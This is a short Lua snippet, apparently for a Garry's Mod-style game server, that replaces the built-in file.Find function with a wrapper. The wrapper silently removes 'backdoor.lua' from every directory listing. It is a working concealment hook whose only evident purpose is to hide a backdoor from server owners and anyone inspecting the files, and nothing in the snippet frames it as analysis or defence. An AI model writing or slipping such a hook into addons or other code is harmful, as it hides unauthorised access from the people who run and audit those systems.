local old = file.Find
file.Find = function(p, g, s)
  local r = old(p,g,s)
  table.RemoveByValue(r, "backdoor.lua")
  return r
end
